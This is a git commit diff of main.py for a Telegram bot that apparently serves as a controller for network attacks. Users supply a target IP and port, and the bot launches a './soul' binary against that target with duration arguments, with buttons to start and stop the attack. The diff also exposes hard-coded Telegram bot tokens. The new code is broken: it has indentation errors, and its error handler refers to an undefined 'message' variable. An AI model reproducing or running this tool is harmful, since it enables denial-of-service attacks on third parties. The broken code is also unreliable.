449c3a3b493f697dedee695aea9c48e9e1d0190c
tufanmahata <165796265+tufanmahata@users.noreply.github.com>
2026-07-12 08:41:52 +0530

    Add files via upload

--- main.py
+++ main.py
@@ -1,48 +1,53 @@
 import telebot
-import os
 import logging
 import subprocess
-import datetime 
+from datetime import datetime, timedelta
 from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
-TOKEN = '8671769971:AAG1NtcDX56rvDIafzHMuEeDVUh6AFmO6eU'
+TOKEN = '8827891490:AAFMQllSddCUE-jKwZJA2HXAvV0HKDo_LEk'
 
 bot = telebot.TeleBot(TOKEN)
 blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
 user_attack_details = {}
 active_attacks = {}
 
-if os.path.exists('./soul'):
-    os.chmod('./soul', 0o755)
-    
 def run_attack_command_sync(user_id, target_ip, target_port, action):
     try:
         if action == 1:
-            process = subprocess.Popen(["./soul", target_ip, str(target_port), "300", "400"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            process = subprocess.Popen(["./soul", target_ip, str(target_port), "1", "60"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             active_attacks[(user_id, target_ip, target_port)] = process.pid
         elif action == 2:
             pid = active_attacks.pop((user_id, target_ip, target_port), None)
             if pid:
                 subprocess.run(["kill", str(pid)], check=True)
     except Exception as e:
-        log_file_path = "error_log.txt"
-        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        try:
-            with open(log_file_path, "a", encoding="utf-8") as f:
-                f.write(f"[{timestamp}] Error in run_attack_command_sync (User: {user_id}, Target: {target_ip}:{target_port}): {e}\n")
-        except Exception as file_error:
-            print(f"Failed to write to log file: {file_error}")
+        logging.error(f"Error in run_attack_command_sync: {e}")
+        send_main_buttons(message.chat.id,0)
         
-
-def send_main_buttons(chat_id):
-    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
-    markup.add(KeyboardButton("Attack"), KeyboardButton("Start Attack 🚀"), KeyboardButton("Stop Attack"))
+        
+def send_main_buttons(chat_id,action):
+   
+     markup = ReplyKeyboardMarkup(row_width=1, resize_keyboard=True, one_time_keyboard=True)
+    
+    if action == 0:
+      
+    markup.add(KeyboardButton("Attack"))
+    
+    elif action == 1:
+    
+    markup.add(KeyboardButton("Start Attack 🚀"))
+    
+    elif action == 2:
+    
+    markup.add(KeyboardButton("Stop Attack"))
+    
     bot.send_message(chat_id, "*Choose an action:*", reply_markup=markup, parse_mode='Markdown')
 
 
 @bot.message_handler(func=lambda message: message.text == "Attack") #commands=['Attack'])
 def attack_command(message):
+
     bot.send_message(message.chat.id, "*Please provide the target IP and port separated by a space.*", parse_mode='Markdown')
     bot.register_next_step_handler(message, process_attack_ip_port)
 
@@ -59,12 +64,11 @@ def process_attack_ip_port(message):
             return
 
         user_attack_details[message.from_user.id] = (target_ip, target_port)
-        send_main_buttons(message.chat.id)
+        send_main_buttons(message.chat.id,1)
     except Exception as e:
         bot.send_message(message.chat.id, "*shi se add kro na *", parse_mode='Markdown')
-        logging.error(f"Error in processing attack IP and port: {e}")
-        
-        
+        send_main_buttons(message.chat.id,0)
+       logging.error(f"Error in processing attack IP and port: {e}")
         
 
 @bot.message_handler(func=lambda message: message.text == "Start Attack 🚀")
@@ -74,9 +78,11 @@ def start_attack(message):
         target_ip, target_port = attack_details
         run_attack_command_sync(message.from_user.id, target_ip, target_port, 1)
         bot.send_message(message.chat.id, f"*Attack started on Host: {target_ip} Port: {target_port}*", parse_mode='Markdown')
+        send_main_buttons(message.chat.id,2)
     else:
         bot.send_message(message.chat.id, "*No target specified. Use /Attack to set it up.*", parse_mode='Markdown')
-
+        send_main_buttons(message.chat.id,0)
+        
 @bot.message_handler(func=lambda message: message.text == "Stop Attack")
 def stop_attack(message):
     attack_details = user_attack_details.get(message.from_user.id)
@@ -87,12 +93,13 @@ def stop_attack(message):
         user_attack_details.pop(message.from_user.id, None)
     else:
         bot.send_message(message.chat.id, "*No active attack found to stop.*", parse_mode='Markdown')
-
+    
+    send_main_buttons(message.chat.id,0)
+    
 @bot.message_handler(commands=['start'])
 def start_command(message):
-    send_main_buttons(message.chat.id)
+    send_main_buttons(message.chat.id,0)
 
 if __name__ == "__main__":
     logging.info("Starting bot...")
-    bot.delete_webhook(drop_pending_updates=True)
     bot.polling(none_stop=True)
